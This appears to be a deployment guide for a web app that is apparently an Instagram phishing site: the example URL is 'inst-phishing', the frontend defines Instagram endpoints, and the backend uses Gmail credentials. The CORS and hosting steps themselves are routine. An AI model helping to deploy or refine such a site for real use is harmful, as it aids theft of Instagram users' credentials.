# 🚀 Deployment Guide

## CORS Configuration Fixed

Your backend now has proper CORS configuration to work with Vercel deployments.

## Step 1: Update Environment Variables

In your `.env` file, **replace** `https://your-project.vercel.app` with your actual Vercel URL:

```env
FRONTEND_URL_PRODUCTION=https://your-actual-project.vercel.app
```

**Example:**
```env
FRONTEND_URL_PRODUCTION=https://inst-phishing.vercel.app
```

## Step 2: Restart Backend Server

After updating the `.env` file:

```bash
cd Backend
npm run dev
```

You should see:
```
📡 Allowed CORS origins: [ 'http://localhost:5173', 'https://your-actual-project.vercel.app' ]
```

## Step 3: Deploy Backend

### Option A: Railway.app (Recommended)

1. Sign up at https://railway.app
2. Create new project → Deploy from GitHub
3. Add environment variables:
   ```
   PORT=5000
   NODE_ENV=production
   MONGO_URI=your_mongodb_connection
   GMAIL_ID=your_email@gmail.com
   GMAIL_PASSWORD=your_app_password
   FRONTEND_URL_LOCAL=http://localhost:5173
   FRONTEND_URL_PRODUCTION=https://your-vercel-url.vercel.app
   ```
4. Deploy!
5. Copy your Railway URL (e.g., `https://your-app.up.railway.app`)

### Option B: Render.com

1. Sign up at https://render.com
2. New → Web Service → Connect GitHub repo
3. Settings:
   - Build Command: `npm install`
   - Start Command: `npm start`
4. Add environment variables (same as Railway)
5. Deploy!

### Option C: Heroku

```bash
heroku login
heroku create your-backend-name
heroku config:set PORT=5000 NODE_ENV=production ...
git push heroku main
```

## Step 4: Update Frontend

After deploying backend, update your frontend's `api-endpoints.js`:

```javascript
const InstagramEndpoints = {
    backendBaseUrl: 'https://your-backend.railway.app', // ← Your Railway/Render URL
    instaBase: 'https://www.instagram.com/',
    // ... rest of URLs
};
```

## Step 5: Test CORS

Test from your browser console on Vercel:

```javascript
fetch('https://your-backend.railway.app/api/health', {
  method: 'GET',
  headers: { 'Content-Type': 'application/json' }
})
.then(r => r.json())
.then(console.log)
.catch(console.error);
```

Should return `{ success: true, message: "API is up and running" }`

## Troubleshooting

### Still Getting CORS Errors?

1. **Check your Vercel URL is exact** (no trailing slash)
   ```env
   ✅ FRONTEND_URL_PRODUCTION=https://my-app.vercel.app
   ❌ FRONTEND_URL_PRODUCTION=https://my-app.vercel.app/
   ```

2. **Restart backend after changing `.env`**

3. **Check browser console** for the exact origin being blocked

4. **Temporarily allow all origins** (for testing only):
   ```javascript
   // In app.js - TEMPORARY ONLY
   app.use(cors({ origin: '*' }));
   ```

### Mixed Content (HTTPS → HTTP)

If your frontend is HTTPS but backend is HTTP, browsers will block it.

**Solution**: Always deploy backend with HTTPS (Railway, Render, Heroku all provide this automatically)

### Socket.IO Not Connecting

Make sure Socket.IO URL in frontend uses HTTPS too:

```javascript
const socket = io('https://your-backend.railway.app', {
  transports: ['websocket', 'polling']
});
```

## What Changed?

### ✅ app.js - Proper CORS Configuration

```javascript
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests from localhost and production Vercel URL
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  credentials: true
};
```

### ✅ server.js - Socket.IO CORS

```javascript
const io = new Server(server, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
    credentials: true
  }
});
```

### ✅ .env - Frontend URLs

```env
FRONTEND_URL_LOCAL=http://localhost:5173
FRONTEND_URL_PRODUCTION=https://your-vercel-url.vercel.app
```

## Quick Reference

| Environment | Backend URL | Frontend URL |
|------------|-------------|--------------|
| **Local Dev** | http://localhost:5000 | http://localhost:5173 |
| **Production** | https://your-backend.railway.app | https://your-app.vercel.app |

## Security Notes

- Never commit `.env` to GitHub (already in `.gitignore`)
- Use Gmail App Passwords, not regular passwords
- Keep MongoDB connection strings secret
- Only allow specific origins in production (not `*`)
